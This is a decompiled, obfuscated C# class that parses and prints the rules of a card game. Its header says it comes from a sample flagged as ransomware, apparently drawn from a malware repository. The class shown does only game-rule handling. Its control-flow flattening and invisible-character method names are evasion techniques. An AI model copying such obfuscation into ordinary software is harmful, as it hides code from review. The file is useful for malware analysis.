// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: ContractHelp, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E915048-53CD-4869-AA6D-7821BA258ED2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-226153caf46a7078970ce7ca5feb4aac6882ecb128e89ec40abb3be26166dd41.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = 1018470169;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1097261011)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1205409633 ^ 521598725;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public static Rules Deserialize(JSONNode json)
    {
      int asInt = json["max-impact"].AsInt;
label_1:
      int num1 = -1226447881;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -611532855)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1051937968 ^ -710714166;
            continue;
          case 2:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * -1978924586 ^ 848822252;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
label_1:
      int num1 = -161820104;
      float[] numArray;
      float[] riskChances;
      int aIndex;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -774894701)) % 11U)
        {
          case 0:
            num1 = (int) num2 * 954042181 ^ 1713538221;
            continue;
          case 1:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = -868248110;
            continue;
          case 3:
            aIndex = 0;
            num1 = (int) num2 * -1189306208 ^ -1642960401;
            continue;
          case 4:
            numArray = new float[json.Count];
            num1 = (int) num2 * -677495098 ^ -1212684054;
            continue;
          case 5:
            goto label_1;
          case 6:
            num1 = (int) num2 * 2099763879 ^ 939233493;
            continue;
          case 7:
            int num3 = !flag ? 1872363587 : (num3 = 1332970625);
            num1 = num3 ^ (int) num2 * -197315498;
            continue;
          case 8:
            ++aIndex;
            num1 = (int) num2 * 1177392462 ^ -10451857;
            continue;
          case 9:
            riskChances = numArray;
            num1 = (int) num2 * -1044617264 ^ 107846809;
            continue;
          case 10:
            flag = aIndex < numArray.Length;
            num1 = -1690151279;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
label_1:
      int num1 = 597735065;
      List<Card> cardList;
      int aIndex1;
      bool flag1;
      bool flag2;
      int aIndex2;
      int num2;
      bool flag3;
      Card[] array;
      JSONNode jsonNode;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 865368206)) % 22U)
        {
          case 0:
            flag1 = num2 < jsonNode[aIndex1].AsInt;
            num1 = 148222326;
            continue;
          case 1:
            cardList = new List<Card>();
            num1 = (int) num3 * 509020879 ^ -1498066041;
            continue;
          case 2:
            aIndex1 = 0;
            num1 = (int) num3 * 1672226824 ^ -801267659;
            continue;
          case 3:
            jsonNode = json[aIndex2];
            num1 = 222013850;
            continue;
          case 4:
            int num4 = !flag1 ? -136166664 : (num4 = -1089090954);
            num1 = num4 ^ (int) num3 * 2016730013;
            continue;
          case 5:
            cardList.Add(new Card()
            {
              Impact = flag2 ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = 1205203797;
            continue;
          case 6:
            flag3 = aIndex2 < count;
            num1 = 938020420;
            continue;
          case 7:
            num2 = 0;
            num1 = 1279800201;
            continue;
          case 8:
            ++aIndex2;
            num1 = (int) num3 * -1411068357 ^ -1416108624;
            continue;
          case 9:
            num1 = (int) num3 * 616282067 ^ -433134173;
            continue;
          case 10:
            int num5;
            num1 = num5 = aIndex1 < maxImpact * 2 ? 885678031 : (num5 = 1270971062);
            continue;
          case 11:
            array = cardList.ToArray();
            num1 = (int) num3 * 281468114 ^ 1514627085;
            continue;
          case 12:
            aIndex2 = 0;
            num1 = (int) num3 * 2134939597 ^ 1571048035;
            continue;
          case 13:
            goto label_1;
          case 14:
            ++num2;
            num1 = (int) num3 * 2126075649 ^ -294868118;
            continue;
          case 15:
            num1 = (int) num3 * -997735840 ^ -79639970;
            continue;
          case 16:
            ++aIndex1;
            num1 = (int) num3 * -1659729169 ^ 885639628;
            continue;
          case 18:
            int num6 = flag3 ? -2143776101 : (num6 = -1682871591);
            num1 = num6 ^ (int) num3 * 1927809092;
            continue;
          case 19:
            num1 = (int) num3 * -107584483 ^ -220488115;
            continue;
          case 20:
            flag2 = aIndex1 < maxImpact;
            num1 = 438627925;
            continue;
          case 21:
            num1 = (int) num3 * 517996165 ^ -1564957335;
            continue;
          default:
            goto label_23;
        }
      }
label_23:
      return array;
    }

    public override string ToString()
    {
      string str = Rules.\u202B‌‪‎⁬⁪‍‎⁯‭⁮‍‭⁬​⁪‏‬⁭⁪⁫‫‎⁭⁫‌​‫‭⁮​‌‌⁬‍⁬‍⁭⁯‍‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
      {
        (object) this.SprintCount,
        (object) this.MaxImpact,
        (object) this.CardsToString(),
        (object) this.InitialResources,
        (object) this.NormalPlanningCount,
        (object) this.NormalPlanningCost,
        (object) this.OverPlanningCost,
        (object) this.SprintsWonWithoutPlanning,
        (object) this.RiskChancesToString(),
        (object) this.EconomicsAffectsAll,
        (object) this.StayOnSprintMinDiff,
        (object) this.OnlyOneWinner
      });
label_1:
      int num1 = -126708555;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1099755630)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1064461109 ^ -1544744933;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = 561728888;
      string str1;
      string str2;
      Card card1;
      int num2;
      int index;
      bool flag;
      Card[] cards;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 885135515)) % 18U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num3 * -1591148984 ^ 2011527040;
            continue;
          case 2:
            card1 = cards[index];
            flag = num2 != card1.Type;
            num1 = 877939894;
            continue;
          case 3:
            ++index;
            num1 = (int) num3 * -1098388884 ^ 470291661;
            continue;
          case 4:
            num1 = (int) num3 * 166464178 ^ 1247318711;
            continue;
          case 5:
            str1 = Rules.\u206A​⁪‏‮⁭⁮⁪⁮‮‬⁭‎‫⁪‎⁭​‍‎⁪⁭⁪⁪⁫‭⁭⁬⁭⁪‎⁫‮⁪⁭⁬‎‪⁫‌‮(str1, "\n\t");
            num1 = (int) num3 * 144156671 ^ -1559337310;
            continue;
          case 6:
            int num4;
            num1 = num4 = index >= cards.Length ? 229294545 : (num4 = 1933808305);
            continue;
          case 7:
            num1 = (int) num3 * -441018758 ^ -373367409;
            continue;
          case 8:
            str2 = Rules.\u206A​⁪‏‮⁭⁮⁪⁮‮‬⁭‎‫⁪‎⁭​‍‎⁪⁭⁪⁪⁫‭⁭⁬⁭⁪‎⁫‮⁪⁭⁬‎‪⁫‌‮(str1, "\n]");
            num1 = (int) num3 * 1425245845 ^ -95612754;
            continue;
          case 9:
            int num5 = flag ? 895704800 : (num5 = 220483503);
            num1 = num5 ^ (int) num3 * 1523024196;
            continue;
          case 11:
            str1 = "[\n\t";
            num1 = (int) num3 * -535154033 ^ -483023303;
            continue;
          case 12:
            num2 = card1.Type;
            num1 = (int) num3 * 1871752652 ^ 1489324061;
            continue;
          case 13:
            num1 = (int) num3 * -339602269 ^ 1620221410;
            continue;
          case 14:
            index = 0;
            num1 = (int) num3 * 1381369449 ^ 149843472;
            continue;
          case 15:
            num2 = 0;
            num1 = (int) num3 * 1205838048 ^ -1578075124;
            continue;
          case 16:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u206E⁬⁪​‍‬⁬⁮‎⁮‬‏⁪⁭⁮‎​‫‪‭‌‫​⁮‬‮⁪‪‬⁭‬⁮‏​⁭⁯⁫‏⁯⁮‮((object) card2) : (string) null;
            str1 = Rules.\u200B‏‎⁫‮‎⁪⁮‫⁯‍‭⁪⁪⁯‪⁮‭‌‬⁬‮‫‪‮‬⁭⁬‎‫⁮‏‮​⁪⁪‏⁫⁪⁮‮(str3, str4, " ");
            num1 = 374029398;
            continue;
          case 17:
            cards = this.Cards;
            num1 = (int) num3 * -695882657 ^ -516720378;
            continue;
          default:
            goto label_19;
        }
      }
label_19:
      return str2;
    }

    private string RiskChancesToString()
    {
      string str1 = Rules.\u206A​⁪‏‮⁭⁮⁪⁮‮‬⁭‎‫⁪‎⁭​‍‎⁪⁭⁪⁪⁫‭⁭⁬⁭⁪‎⁫‮⁪⁭⁬‎‪⁫‌‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u200D​‮⁯‫⁮⁯⁪‍‏‪‫⁫⁯⁫⁯⁭‌⁭‮‭⁫‮‮⁯⁪‬‍‫‮⁪‏‫‌‬⁭‫‍‮‏‮()));
label_1:
      int num1 = -1113396515;
      int index;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -413042731)) % 7U)
        {
          case 1:
            ++index;
            num1 = (int) num2 * -474712851 ^ 131903019;
            continue;
          case 2:
            goto label_1;
          case 3:
            index = 1;
            num1 = (int) num2 * -1412340713 ^ -1707984468;
            continue;
          case 4:
            str1 = Rules.\u200B‏‎⁫‮‎⁪⁮‫⁯‍‭⁪⁪⁯‪⁮‭‌‬⁬‮‫‪‮‬⁭⁬‎‫⁮‏‮​⁪⁪‏⁫⁪⁮‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u200D​‮⁯‫⁮⁯⁪‍‏‪‫⁫⁯⁫⁯⁭‌⁭‮‭⁫‮‮⁯⁪‬‍‫‮⁪‏‫‌‬⁭‫‍‮‏‮()));
            num1 = -468878450;
            continue;
          case 5:
            int num3;
            num1 = num3 = index >= this.RiskChances.Length ? -1880172035 : (num3 = -401316086);
            continue;
          case 6:
            str2 = Rules.\u206A​⁪‏‮⁭⁮⁪⁮‮‬⁭‎‫⁪‎⁭​‍‎⁪⁭⁪⁪⁫‭⁭⁬⁭⁪‎⁫‮⁪⁭⁬‎‪⁫‌‮(str1, " ]");
            num1 = (int) num2 * 2004620319 ^ 1702720114;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return str2;
    }

    static string \u202B‌‪‎⁬⁪‍‎⁯‭⁮‍‭⁬​⁪‏‬⁭⁪⁫‫‎⁭⁫‌​‫‭⁮​‌‌⁬‍⁬‍⁭⁯‍‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u206A​⁪‏‮⁭⁮⁪⁮‮‬⁭‎‫⁪‎⁭​‍‎⁪⁭⁪⁪⁫‭⁭⁬⁭⁪‎⁫‮⁪⁭⁬‎‪⁫‌‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u206E⁬⁪​‍‬⁬⁮‎⁮‬‏⁪⁭⁮‎​‫‪‭‌‫​⁮‬‮⁪‪‬⁭‬⁮‏​⁭⁯⁫‏⁯⁮‮([In] object obj0) => obj0.ToString();

    static string \u200B‏‎⁫‮‎⁪⁮‫⁯‍‭⁪⁪⁯‪⁮‭‌‬⁬‮‫‪‮‬⁭⁬‎‫⁮‏‮​⁪⁪‏⁫⁪⁮‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u200D​‮⁯‫⁮⁯⁪‍‏‪‫⁫⁯⁫⁯⁭‌⁭‮‭⁫‮‮⁯⁪‬‍‫‮⁪‏‫‌‬⁭‫‍‮‏‮() => CultureInfo.InvariantCulture;
  }
}
